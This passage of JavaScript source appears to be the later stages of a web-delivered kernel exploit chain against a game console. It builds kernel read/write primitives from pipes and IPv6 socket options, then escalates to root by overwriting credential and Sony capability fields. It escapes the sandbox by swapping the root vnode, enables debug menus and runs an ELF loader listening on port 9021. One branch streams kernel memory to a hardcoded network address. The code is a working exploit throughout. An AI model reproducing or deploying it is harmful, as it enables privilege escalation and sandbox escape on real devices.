        let OFFSET_UIO_TD       = 0x28;
        let search_iov_base     = orig_iov_base;
        let search_iov_len      = kprim_read_size;

        // Find iov+uio pair on the stack
        let stack_iov_offset = -1;

        for (let i = 0; i < 0x1000; i += 0x8) {
            let possible_iov_base = p.read8(kstack.add32(0x3000 + i + OFFSET_IOV_BASE));
            let possible_iov_len  = p.read8(kstack.add32(0x3000 + i + OFFSET_IOV_LEN));

            /*if (i > 0x700 && i < 0x800) {
                debug_log("update_iov_in_kstack i=0x" + i.toString(16) + ", possible iov=0x" + possible_iov_base + ", len=0x" + possible_iov_len);
            }*/
            if (possible_iov_base.high == search_iov_base.high && possible_iov_base.low == search_iov_base.low && 
                possible_iov_len.low == search_iov_len) {
                let possible_uio_resid  = p.read8(kstack.add32(0x3000 + i + SIZE_IOV + OFFSET_UIO_RESID));
                let possible_uio_segflg = p.read4(kstack.add32(0x3000 + i + SIZE_IOV + OFFSET_UIO_SEGFLG));
                let possible_uio_rw     = p.read4(kstack.add32(0x3000 + i + SIZE_IOV + OFFSET_UIO_RW));

                //debug_log("update_iov_in_kstack, possible uio_resid=0x" + possible_uio_resid + ", uio_segflg=0x" + possible_uio_segflg.toString(16) + ", uio_rw=0x" + possible_uio_rw.toString(16));

                if (possible_uio_resid.low == search_iov_len && possible_uio_segflg == 0 && possible_uio_rw == is_write) {
                    //debug_log("[+] found iov on stack @ 0x" + i.toString(16));
                    stack_iov_offset = i;
                    break;
                }
            }
        }

        if (stack_iov_offset < 0) {
            debug_log("[!] failed to find iov");
            return -1;
        }

        // Modify iov for kernel address + r/w
        p.write8(kstack.add32(0x3000 + stack_iov_offset + OFFSET_IOV_BASE), new_iov_base);
        p.write4(kstack.add32(0x3000 + stack_iov_offset + SIZE_IOV + OFFSET_UIO_SEGFLG), uio_segflg);
        return 0;
    }

    async function slow_copyout(kaddr, uaddr) {
        // Fill pipe up to max
        for (let i = 0; i < pipe_size; i += 0x1000) {
            await chain.syscall(SYS_WRITE, pipe_slow_write_fd, pipe_scratch_buf, 0x1000);
        }

        // Signal other thread to write using size we want, the thread will hang until we read
        await send_cmd_to_kprim_thread(KPRIM_READ, uaddr, kaddr);

        if (update_iov_in_kstack(pipe_scratch_buf, kaddr, 1, 1) < 0)
            return;

        // Read garbage filler data
        let received_bytes = await chain.syscall(SYS_READ, pipe_slow_read_fd, pipe_scratch_buf, 0x10000);

        // Read kernel data
        return await chain.syscall(SYS_READ, pipe_slow_read_fd, uaddr, kprim_read_size);
    }

    async function slow_copyin(uaddr, kaddr) {
        // Signal other thread to read using size we want, the thread will hang until we write
        await send_cmd_to_kprim_thread(KPRIM_WRITE, uaddr, kaddr);

        if (update_iov_in_kstack(pipe_scratch_buf, kaddr, 1, 0) < 0)
           return;

        // Write data to write to pointer
        return await chain.syscall(SYS_WRITE, pipe_slow_write_fd, uaddr, 0x8);
    }

    let slow_kr_page_store  = p.malloc(0x4000);
    let slow_kr_qword_store = p.malloc(0x8);
    let slow_kw_qword_store = p.malloc(0x8);

    async function kernel_slow_write8(kaddr, val) {
        p.write8(slow_kw_qword_store, val);
        await slow_copyin(slow_kw_qword_store, kaddr);
    }

    async function kernel_slow_read8(kaddr) {
        await slow_copyout(kaddr, slow_kr_qword_store);
        return p.read8(slow_kr_qword_store);
    }

    async function kernel_slow_readpage(kaddr) {
        for (let i = 0; i < 0x4000; i += kprim_read_size)
            await slow_copyout(kaddr.add32(i), slow_kr_page_store.add32(i));
        return slow_kr_page_store;
    }

    async function kernel_readstr(kaddr) {
        await slow_copyout(kaddr, slow_kr_qword_store);
        let str = "";
        for (let i = 0; i < 8; i++) {
            let c = p.read1(slow_kr_qword_store.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);
        }
        return str;
    }

    // If this is running on a firmware that doesn't have good kernel offsets, find kernel data base
    let save_presumed_kdata_base = 0;
    if (OFFSET_KERNEL_DATA == 0xDEADC0DE) {
        // Code for firmwares where finding kernel offsets is tricky, we take a known data
        // pointer from the stack, page align, and search backwards for a pattern in rodata
        // 01 00 00 00 01 00 00 00
        var known_data_addr     = 0x8E0;
        var estimate_min_pages  = 0x50;
        var kernel_unkaddr      = p.read8(kstack.add32(0x3000 + known_data_addr));
        var kernel_data_page    = kernel_unkaddr.and32(0xFFFFC000);

        let presumed_kdata_base = kernel_data_page.sub32(0x16C000); // 1.05
        save_presumed_kdata_base = presumed_kdata_base;
        if (presumed_kdata_base == 0) {
            alert("Trying to bruteforce kernel base (minpages=0x" + estimate_min_pages.toString(16) + "), this can take a while...");
            debug_log("[+] don't have kernel offsets, trying to bruteforce kernel base (minpages=0x" + estimate_min_pages.toString(16) + "), this can take a while...");
            for (let i = (estimate_min_pages * 0x4000); ; i += 0x4000) {
                let test_kernel_addr = kernel_data_page.sub32(i);
                debug_log("[+] trying read @ i=0x" + i.toString(16) + ", addr=0x" + test_kernel_addr);

                let data1 = await kernel_slow_read8(test_kernel_addr.add32(0x00));
                if (data1.low != 1 || data1.hi != 1) {
                    continue;
                }

                let data2 = await kernel_slow_read8(test_kernel_addr.add32(0x08));
                if (data2.low != 0 || data2.hi != 0) {
                    continue;
                }

                let data3 = await kernel_slow_read8(test_kernel_addr.add32(0x10));
                debug_log("[+] data1=0x" + data1 + ", data2=0x" + data2 + ", data3=0x" + data3);

                if (data3.hi == 0xFFFFFFFF) {
                    presumed_kdata_base = test_kernel_addr;
                    debug_log("[+] found kdata base: 0x" + presumed_kdata_base + " (i=0x" + i.toString(16) + ")");
                    break;
                }
            }
        }

        debug_log("[+] kptr=0x" + kptr);
        let ktext_base = presumed_kdata_base.sub32(0x01B40000);
        let sys_sched_yield_ret_off = kptr.low - ktext_base.low;
        debug_log("[+] sched_yield_ret offset=0x" + sys_sched_yield_ret_off.toString(16));
    }

    ///////////////////////////////////////////////////////////////////////
    // Stage 3: Bigger & better kernel arbitrary read/write
    ///////////////////////////////////////////////////////////////////////

    //alert("stage 3 - kdata_base=0x" + kdata_base);

    // Current process addr can be found in kstack
    let curthr_addr     = p.read8(kstack.add32(0x3000 + 0xAB0));
    let curproc_addr    = await kernel_slow_read8(curthr_addr.add32(0x8));   // td_proc
    let proc_ucred_addr = await kernel_slow_read8(curproc_addr.add32(0x40)); // p_ucred (ucred)
    let proc_fd_addr    = await kernel_slow_read8(curproc_addr.add32(0x48)); // p_fd (filedesc)

    if (proc_ucred_addr == 0 || proc_fd_addr == 0) {
        debug_log("[!] failed to find process");
        return;
    }

    debug_log("[+] found proc->p_ucred=0x" + proc_ucred_addr + ", proc->p_fd=0x" + proc_fd_addr);

    let ofiles_addr = await kernel_slow_read8(proc_fd_addr.add32(0x00)); // fd_files
    ofiles_addr.add32inplace(0x08); // account for fdt_nfiles

    /*
     * Pipe blocking-based r/w we have works but isn't great, it's slow and
     * relies on a worker thread. We'll escalate that r/w into a better one
     * by using an ipv6 socket pair as a r/w window into a pipe pair, so
     * we can use ipv6 sockets to set addresses and pipe pair for r/w data.
     */

    const AF_INET      = 2;
    const AF_INET6     = 28;
    const SOCK_STREAM  = 1;
    const SOCK_DGRAM   = 2;
    const IPPROTO_UDP  = 17;
    const IPPROTO_IPV6 = 41;
    const IPV6_PKTINFO        = 46;

    let master_target_buffer = p.malloc(0x14);
    let slave_buffer = p.malloc(0x14);
    let pipemap_buffer = p.malloc(0x14);
    let pktinfo_size_store = p.malloc(0x8);
    p.write8(pktinfo_size_store, 0x14);

    // Create ipv6 socket pair
    let master_sock = (await chain.syscall(SYS_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)).low;
    let victim_sock  = (await chain.syscall(SYS_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)).low;
    let x1 = await chain.syscall(SYS_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14);
    let x2 = await chain.syscall(SYS_SETSOCKOPT, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14);

    // Find sockets and get pktopts-based r/w
    let master_sock_filedescent_addr    = ofiles_addr.add32(master_sock * 0x30);
    let victim_sock_filedescent_addr     = ofiles_addr.add32(victim_sock * 0x30);

    let master_sock_file_addr   = await kernel_slow_read8(master_sock_filedescent_addr);
    let victim_sock_file_addr    = await kernel_slow_read8(victim_sock_filedescent_addr);

    let master_sock_socket_addr = await kernel_slow_read8(master_sock_file_addr);
    let victim_sock_socket_addr  = await kernel_slow_read8(victim_sock_file_addr);

    let master_pcb  = await kernel_slow_read8(master_sock_socket_addr.add32(0x18));
    let slave_pcb   = await kernel_slow_read8(victim_sock_socket_addr.add32(0x18));

    let master_pktopts  = await kernel_slow_read8(master_pcb.add32(0x120));
    let slave_pktopts   = await kernel_slow_read8(slave_pcb.add32(0x120));

    await kernel_slow_write8(master_pktopts.add32(0x10), slave_pktopts.add32(0x10));

    async function write_to_victim(addr) {
        p.write8(master_target_buffer.add32(0x00), addr);
        p.write8(master_target_buffer.add32(0x08), 0);
        p.write4(master_target_buffer.add32(0x10), 0);
        await chain.syscall(SYS_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14);
    }

    async function ipv6_kread(addr, buffer) {
        await write_to_victim(addr);
        await chain.syscall(SYS_GETSOCKOPT, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer, pktinfo_size_store);
    }

    async function ipv6_kwrite(addr, buffer) {
        await write_to_victim(addr);
        await chain.syscall(SYS_SETSOCKOPT, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer, 0x14);
    }

    async function ipv6_kread8(addr) {
        await ipv6_kread(addr, slave_buffer);
        return p.read8(slave_buffer);
    }

    // Create pipe pair and ultimate r/w prims
    let pipe_mem            = p.malloc(0x8);
    await chain.syscall(SYS_PIPE2, pipe_mem, 0);

    let pipe_read           = p.read4(pipe_mem);
    let pipe_write          = p.read4(pipe_mem.add32(0x4));
    let pipe_filedescent    = ofiles_addr.add32(pipe_read * 0x30);
    let pipe_file           = await ipv6_kread8(pipe_filedescent);
    let pipe_addr           = await ipv6_kread8(pipe_file);

    async function copyout(src, dest, length) {
        if (typeof copyout.value == 'undefined') {
            copyout.value0 = new int64(0x40000000, 0x40000000);
            copyout.value1 = new int64(0x00000000, 0x40000000);
        }
        p.write8(pipemap_buffer, copyout.value0);
        p.write8(pipemap_buffer.add32(0x8), copyout.value1);
        p.write4(pipemap_buffer.add32(0x10), 0x0);
        await ipv6_kwrite(pipe_addr, pipemap_buffer);

        p.write8(pipemap_buffer, src);
        p.write8(pipemap_buffer.add32(0x8), 0x0);
        p.write4(pipemap_buffer.add32(0x10), 0x0);
        await ipv6_kwrite(pipe_addr.add32(0x10), pipemap_buffer);

        return await chain.syscall(SYS_READ, pipe_read, dest, length);
    }

    async function copyin(src, dest, length) {
        if (typeof copyin.value == 'undefined') {
            copyin.value = new int64(0x00000000, 0x40000000);
        }

        p.write8(pipemap_buffer, 0x0);
        p.write8(pipemap_buffer.add32(0x8), copyin.value);
        p.write4(pipemap_buffer.add32(0x10), 0x0);
        await ipv6_kwrite(pipe_addr, pipemap_buffer);

        p.write8(pipemap_buffer, dest);
        p.write8(pipemap_buffer.add32(0x8), 0x0);
        p.write4(pipemap_buffer.add32(0x10), 0x0);
        await ipv6_kwrite(pipe_addr.add32(0x10), pipemap_buffer);

        return await chain.syscall(SYS_WRITE, pipe_write, src, length);
    }

    let krw_qword_store = p.malloc(0x8);

    async function kernel_write8(kaddr, val) {
        p.write8(krw_qword_store, val);
        await copyin(krw_qword_store, kaddr, 0x8);
    }

    async function kernel_write4(kaddr, val) {
        p.write4(krw_qword_store, val);
        await copyin(krw_qword_store, kaddr, 0x4);
    }
    
    async function kernel_write2(kaddr, val) {
        p.write2(krw_qword_store, val);
        await copyin(krw_qword_store, kaddr, 0x2);
    }

    async function kernel_write1(kaddr, val) {
        p.write1(krw_qword_store, val);
        await copyin(krw_qword_store, kaddr, 0x1);
    }

    async function kernel_read8(kaddr) {
        await copyout(kaddr, krw_qword_store, 0x8);
        return p.read8(krw_qword_store);
    }

    async function kernel_read4(kaddr) {
        await copyout(kaddr, krw_qword_store, 0x4);
        return p.read4(krw_qword_store);
    }

    async function kernel_read2(kaddr) {
        await copyout(kaddr, krw_qword_store, 0x2);
        return p.read2(krw_qword_store);
    }

    async function kernel_read1(kaddr) {
        await copyout(kaddr, krw_qword_store, 0x1);
        return p.read1(krw_qword_store);
    }

    ///////////////////////////////////////////////////////////////////////
    // Stage 4: Fix-up
    ///////////////////////////////////////////////////////////////////////

    /*
     * Increase refcounts on socket fds which we corrupt
     */

    async function inc_socket_refcount(target_fd) {
        let filedescent_addr = ofiles_addr.add32(target_fd * 0x30);
        let file_addr        = await kernel_read8(filedescent_addr.add32(0x00)); // fde_file
        let file_data_addr   = await kernel_read8(file_addr.add32(0x00));        // f_data
        await kernel_write4(file_data_addr.add32(0x00), 0x100);                  // so_count
    }

    await inc_socket_refcount(master_sock);
    await inc_socket_refcount(victim_sock);
    debug_log("[+] leaked references on ipv6 r/w sockets");

    /* 
     * We need to increase the refcount on the fd that acquires kernel stack space
     */

    // Increase refcount on lookup fd so the kernel stack region doesn't get cleaned up on proc exit
    let filedescent_addr = ofiles_addr.add32(lookup_fd * 0x30); // fdt_ofiles[fd], sizeof(filedescent) = 0x30
    let file_addr        = await kernel_read8(filedescent_addr.add32(0x00)); // fde_file
    let file_data_addr   = await kernel_read8(file_addr.add32(0x00));        // f_data
    await kernel_write8(file_data_addr.add32(0x10), 0x10);                   // shm_refs
    await kernel_write8(file_addr.add32(0x28), 0x10);                        // f_count

    let close_test_res = await shm_close(lookup_fd);
    debug_log("[+] leaked references on shm for fixup, close=0x" + close_test_res);

    /*
     * We also need to zero the thread kstack for the kernel prim thread
     */
    let proc_thread_addr      = await kernel_read8(curproc_addr.add32(0x10));      // p_threads

    for (;;) {
        let next_thread       = await kernel_read8(proc_thread_addr.add32(0x10));  // td_plist

        let thread_name       = await kernel_read8(proc_thread_addr.add32(0x294)); // td_name
        let thread_kstack_obj = await kernel_read8(proc_thread_addr.add32(0x468)); // td_kstack_obj
        let thread_kstack     = await kernel_read8(proc_thread_addr.add32(0x470)); // td_kstack

        //debug_log("  thread_name=0x" + thread_name + ", thread_kstack=0x" + thread_kstack + ", thread_kstack_obj=0x" + thread_kstack_obj);

        if (thread_name.low == 0x6E6F6E00) {
            debug_log("[+] removing kstack ref on thread name=0x" + thread_name);
            await kernel_write8(proc_thread_addr.add32(0x470), 0);

            thread_kstack     = await kernel_read8(proc_thread_addr.add32(0x470)); // td_kstack
            //debug_log("  thread_name=0x" + thread_name + ", thread_kstack=0x" + thread_kstack + ", thread_kstack_obj=0x" + thread_kstack_obj);
            break;
        }

        if (next_thread.low == 0) {
            break;
        }

        proc_thread_addr    = next_thread;
    }

    debug_log("[+] fixes applied");

    ///////////////////////////////////////////////////////////////////////
    // Stage 5: Post-exploitation
    ///////////////////////////////////////////////////////////////////////

    if (OFFSET_KERNEL_DATA == 0xDEADC0DE) {
        debug_log("[+] don't have kernel offsets, entering path to dump kernel .data");

        function htons(port) {
            return ((port & 0xFF) << 8) | (port >>> 8);
        }
    
        function aton(ip) {
            let chunks = ip.split('.');
            let addr = 0;
            for(let i = 0; i < 4; i++) {
                addr |= (parseInt(chunks[i]) << (i * 8));
            }
            return addr >>> 0;
        }
    
        let DUMP_NET_ADDR = aton("10.0.0.143");
        let DUMP_NET_PORT = htons(5656);
    
        function build_addr(buf, family, port, addr) {
            p.write1(buf.add32(0x00), 0x10);
            p.write1(buf.add32(0x01), family);
            p.write2(buf.add32(0x02), port);
            p.write4(buf.add32(0x04), addr);
        }
    
        let dump_sock_addr_store    = p.malloc(0x10);
        let dump_sock_send_sz_store = p.malloc(0x4);
        let dump_sock_connected     = 0;
    
        let dump_sock_fd = await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0);
        debug_log("[+] opened dump sock=0x" + dump_sock_fd);
    
        for (let i = 0; i < 0x10; i += 0x8) {
            p.write8(dump_sock_addr_store.add32(i), 0);
        }
    
        build_addr(dump_sock_addr_store, AF_INET, DUMP_NET_PORT, DUMP_NET_ADDR);
    
        async function dump_net(buf, size) {
            p.write4(dump_sock_send_sz_store, size);
    
            if (dump_sock_connected == 0) {
                debug_log("[+] connecting to dump server...");
                let connect_res = await chain.syscall(SYS_CONNECT, dump_sock_fd, dump_sock_addr_store, 0x10);
                debug_log("[+] connected dump sock=0x" + connect_res);
                dump_sock_connected = 1;
            }
    
            await chain.syscall(SYS_WRITE, dump_sock_fd, buf, size);
            await chain.run();
        }
    
        let dump_addr = save_presumed_kdata_base;
        let dump_page = p.malloc(0x4000);
    
        alert("About to dump kernel .data (0x" + dump_addr + "), ensure dump server is running...");
        debug_log("[+] dumping kernel .data (0x" + dump_addr + ") until crash");
        for (let j = 0; ; j++) {
            await copyout(dump_addr, dump_page, 0x4000);
            await dump_net(dump_page, 0x4000);
            dump_addr = dump_addr.add32(0x4000);
        }
    
        debug_log("[+] kernel dump should not reach here we should have died by now");
    }

    function get_kaddr(offset) {
        return kbase.add32(offset);
    }

    // Set security flags
    let security_flags = await kernel_read4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS));
    await kernel_write4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS), security_flags | 0x14);

    // Set targetid to DEX
    await kernel_write1(OFFSET_KERNEL_TARGETID, 0x82);

    // Set qa flags and utoken flags for debug menu enable
    let qaf_dword = await kernel_read4(get_kaddr(OFFSET_KERNEL_QA_FLAGS));
    await kernel_write4(get_kaddr(OFFSET_KERNEL_QA_FLAGS), qaf_dword | 0x10300);

    let utoken_flags = await kernel_read1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS));
    await kernel_write1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS), utoken_flags | 0x1);
    debug_log("[+] enabled debug menu");

    // Patch creds
    let cur_uid = await chain.syscall(SYS_GETUID);
    debug_log("[+] escalating creds (current uid=0x" + cur_uid + ")");

    await kernel_write4(proc_ucred_addr.add32(0x04), 0); // cr_uid
    await kernel_write4(proc_ucred_addr.add32(0x08), 0); // cr_ruid
    await kernel_write4(proc_ucred_addr.add32(0x0C), 0); // cr_svuid
    await kernel_write4(proc_ucred_addr.add32(0x10), 1); // cr_ngroups
    await kernel_write4(proc_ucred_addr.add32(0x14), 0); // cr_rgid

    // Escalate sony privs
    await kernel_write8(proc_ucred_addr.add32(0x58), new int64(0x00000013, 0x48010000)); // cr_sceAuthId
    await kernel_write8(proc_ucred_addr.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[0]
    await kernel_write8(proc_ucred_addr.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[1]
    await kernel_write1(proc_ucred_addr.add32(0x83), 0x80);                              // cr_sceAttr[0]

    cur_uid = await chain.syscall(SYS_GETUID);
    debug_log("[+] we root now? uid=0x" + cur_uid);

    // Escape sandbox
    let is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
    debug_log("[+] jailbreaking (in sandbox: " + is_in_sandbox + ")");
    let rootvnode = await kernel_read8(get_kaddr(OFFSET_KERNEL_ROOTVNODE));
    await kernel_write8(proc_fd_addr.add32(0x10), rootvnode); // fd_rdir
    await kernel_write8(proc_fd_addr.add32(0x18), rootvnode); // fd_jdir

    is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
    debug_log("[+] we escaped now? in sandbox: " + is_in_sandbox);

    ///////////////////////////////////////////////////////////////////////
    // Stage 6: loader
    ///////////////////////////////////////////////////////////////////////

    let dlsym_addr = syscalls[SYS_DYNLIB_DLSYM];
    let jit_handle_store = p.malloc(0x4);
    let test_store_buf   = p.malloc(0x4);

    // ELF sizes and offsets
    let SIZE_ELF_HEADER = 0x40;
    let SIZE_ELF_PROGRAM_HEADER = 0x38;

    let OFFSET_ELF_HEADER_ENTRY = 0x18;
    let OFFSET_ELF_HEADER_PHOFF = 0x20;
    let OFFSET_ELF_HEADER_PHNUM = 0x38;

    let OFFSET_PROGRAM_HEADER_TYPE = 0x00;
    let OFFSET_PROGRAM_HEADER_FLAGS = 0x04;
    let OFFSET_PROGRAM_HEADER_OFFSET = 0x08;
    let OFFSET_PROGRAM_HEADER_VADDR = 0x10;
    let OFFSET_PROGRAM_HEADER_MEMSZ = 0x28;

    let OFFSET_RELA_OFFSET = 0x00;
    let OFFSET_RELA_INFO = 0x08;
    let OFFSET_RELA_ADDEND = 0x10;

    // ELF program header types
    let ELF_PT_LOAD = 0x01;
    let ELF_PT_DYNAMIC = 0x02;

    // ELF dynamic table types
    let ELF_DT_NULL = 0x00;
    let ELF_DT_RELA = 0x07;
    let ELF_DT_RELASZ = 0x08;
    let ELF_DT_RELAENT = 0x09;
    let ELF_R_AMD64_RELATIVE = 0x08;

    // ELF parsing
    let conn_ret_store = p.malloc(0x8);

    let elf_store_size = SIZE_ELF_HEADER + (SIZE_ELF_PROGRAM_HEADER * 0x10) + 0x1000000;
    let elf_store = p.malloc(elf_store_size);

    let shadow_mapping_addr = new int64(0x20100000, 0x00000009);
    let mapping_addr = new int64(0x26100000, 0x00000009);

    let elf_program_headers_offset = 0;
    let elf_program_headers_num = 0;

    async function load_payload_into_elf_store_from_local_file(filename) {
        debug_log("[+] loading ELF file: " + filename + " ...")
        const response = await fetch('payloads/' + filename);
        if (!response.ok) {
            throw new Error(`Failed to fetch the binary file. Status: ${response.status}`);
        }

        const data = await response.arrayBuffer();
        const byteArray = new Uint32Array(data);

        // zero out elf_store.backing
        elf_store.backing.fill(0);

        elf_store.backing.set(byteArray);
        return byteArray.byteLength;
    }

    async function parse_elf_store(total_sz = -1) {
        // Parse header
        // These are global variables
        elf_program_headers_offset = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHOFF));
        elf_program_headers_num = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHNUM)) & 0xFFFF;
        elf_entry_point = p.read4(elf_store.add32(OFFSET_ELF_HEADER_ENTRY));

        if (elf_program_headers_offset != 0x40) {
            debug_log("[!] ELF header malformed, terminating connection.");
            throw new Error("ELF header malformed, terminating connection.");
        }

        //debug_log("[+] parsing ELF file (" + total_sz.toString(10) + " bytes)...");

        let text_segment_sz = 0;
        let data_segment_sz = 0;
        let rela_table_offset = 0;
        let rela_table_count = 0;
        let rela_table_size = 0;
        let rela_table_entsize = 0;
        let shadow_write_mapping = 0;

        // Parse program headers and map segments
        for (let i = 0; i < elf_program_headers_num; i++) {
            let program_header_offset = elf_program_headers_offset + (i * SIZE_ELF_PROGRAM_HEADER);

            let program_type = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_TYPE));
            let program_flags = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_FLAGS));
            let program_offset = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_OFFSET));
            let program_vaddr = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_VADDR));
            let program_memsz = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_MEMSZ));
            let aligned_memsz = (program_memsz + 0x3FFF) & 0xFFFFC000;

            if (program_type == ELF_PT_LOAD) {
                // For executable segments, we need to take some care and do alias'd mappings.
                // Also, the mapping size is fixed at 0x100000. This is because jitshm requires to be aligned this way... for some dumb reason.
                if ((program_flags & 1) == 1) {
                    // Executable segment
                    text_segment_sz = program_memsz;

                    // Get exec
                    await chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_CREATE, 0x0, aligned_memsz, 0x7);
                    await chain.run();
                    let exec_handle = p.read4(jit_handle_store);

                    // Get write alias
                    await chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_ALIAS, exec_handle, 0x3);
                    await chain.run();
                    let write_handle = p.read4(jit_handle_store);

                    // Map to shadow mapping
                    await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, shadow_mapping_addr, aligned_memsz, 0x3, 0x11, write_handle, 0);
                    await chain.run();
                    shadow_write_mapping = p.read8(conn_ret_store);

                    // Copy in segment data
                    let dest = p.read8(conn_ret_store);
                    for (let j = 0; j < program_memsz; j += 0x8) {
                        let src_qword = p.read8(elf_store.add32(program_offset + j));
                        p.write8(dest.add32(j), src_qword);
                    }

                    // Map executable segment
                    await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x5, 0x11, exec_handle, 0);
                    await chain.run();
                } else {
                    // Regular data segment
                    data_mapping_addr = mapping_addr.add32(program_vaddr);
                    data_segment_sz = aligned_memsz;

                    await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x3, 0x1012, 0xFFFFFFFF, 0);
                    await chain.run();

                    // Copy in segment data
                    let dest = mapping_addr.add32(program_vaddr);
                    for (let j = 0; j < program_memsz; j += 0x8) {
                        let src_qword = p.read8(elf_store.add32(program_offset + j));
                        p.write8(dest.add32(j), src_qword);
                    }
                }
            }

            if (program_type == ELF_PT_DYNAMIC) {
                // Parse dynamic tags, the ones we truly care about are rela-related.
                for (let j = 0x00; ; j += 0x10) {
                    let d_tag = p.read8(elf_store.add32(program_offset + j)).low;
                    let d_val = p.read8(elf_store.add32(program_offset + j + 0x08));

                    // DT_NULL means we reached the end of the table
                    if (d_tag == ELF_DT_NULL || j > 0x100) {
                        break;
                    }

                    switch (d_tag) {
                        case ELF_DT_RELA:
                            rela_table_offset = d_val.low;
                            break;
                        case ELF_DT_RELASZ:
                            rela_table_size = d_val.low;
                            break;
                        case ELF_DT_RELAENT:
                            rela_table_entsize = d_val.low;
                            break;
                    }
                }
            }
        }

        // Process relocations if they exist
        if (rela_table_offset != 0) {
            let base_address = 0x1000;

            // The rela table offset from dynamic table is relative to the LOAD segment offset not file offset.
            // The linker script should guarantee it ends up in the first LOAD segment (code).
            rela_table_offset += base_address;

            // Rela count can be gotten from dividing the table size by entry size
            rela_table_count = rela_table_size / rela_table_entsize;

            // Parse relocs and apply them
            for (let i = 0; i < rela_table_count; i++) {
                let r_offset = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                    OFFSET_RELA_OFFSET));
                let r_info = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                    OFFSET_RELA_INFO));
                let r_addend = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                    OFFSET_RELA_ADDEND));

                let reloc_addr = mapping_addr.add32(r_offset.low);

                // If the relocation falls in the executable section, we need to redirect the write to the
                // writable shadow mapping or we'll crash
                if (r_offset.low <= text_segment_sz) {
                    reloc_addr = shadow_write_mapping.add32(r_offset.low);
                }

                if ((r_info.low & 0xFF) == ELF_R_AMD64_RELATIVE) {
                    let reloc_value = mapping_addr.add32(r_addend.low); // B + A
                    p.write8(reloc_addr, reloc_value);
                }
            }
        }

    }

    // reuse these plus we can more easily access them
    let rwpair_mem = p.malloc(0x8);
    let test_payload_store = p.malloc(0x8);
    let pthread_handle_store = p.malloc(0x8);
    let pthread_value_store = p.malloc(0x8);
    let args = p.malloc(0x8 * 6);

    async function execute_elf_store() {
        // zero out the buffers defined above
        p.write8(rwpair_mem, 0);
        p.write8(rwpair_mem.add32(0x4), 0);
        p.write8(test_payload_store, 0);
        p.write8(pthread_handle_store, 0);
        p.write8(pthread_value_store, 0);
        for (let i = 0; i < 0x8 * 6; i++) {
            p.write1(args.add32(i), 0);
        }

        // Pass master/victim pair to payload so it can do read/write
        p.write4(rwpair_mem.add32(0x00), master_sock);
        p.write4(rwpair_mem.add32(0x04), victim_sock);

        // Arguments to entrypoint
        p.write8(args.add32(0x00), dlsym_addr);         // arg1 = dlsym_t* dlsym
        p.write8(args.add32(0x08), pipe_mem);           // arg2 = int *rwpipe[2]
        p.write8(args.add32(0x10), rwpair_mem);         // arg3 = int *rwpair[2]
        p.write8(args.add32(0x18), pipe_addr);          // arg4 = uint64_t kpipe_addr
        p.write8(args.add32(0x20), kdata_base);         // arg5 = uint64_t kdata_base_addr
        p.write8(args.add32(0x28), test_payload_store); // arg6 = int *payloadout
        // Execute payload in pthread
        //debug_log("  [+] executing!");
        await chain.call(libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, mapping_addr.add32(elf_entry_point), args, p.stringify("payload"));

    }

    async function wait_for_elf_to_exit() {
        // Join pthread and wait until we're finished executing
        await chain.call(libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
        //debug_log("  [+] finished, out = 0x" + p.read8(test_payload_store).toString(16));

        // await debug_log("[+] Done.");
    }

    async function load_local_elf(filename) {
        try {
            let total_sz = await load_payload_into_elf_store_from_local_file(filename);
            await parse_elf_store(total_sz);
            await execute_elf_store();
            await wait_for_elf_to_exit();
        } catch (error) {
            debug_log("[!] failed to load local elf: " + error);
        }
    }

    await load_local_elf("elfldr.elf");
    debug_log("[+] ELF loader listening on :9021");
}

async function run_hax() {
    await userland();
}


let fwScript = document.createElement('script');
document.body.appendChild(fwScript);
fwScript.setAttribute('src', `offsets/${fw_str}.js`);
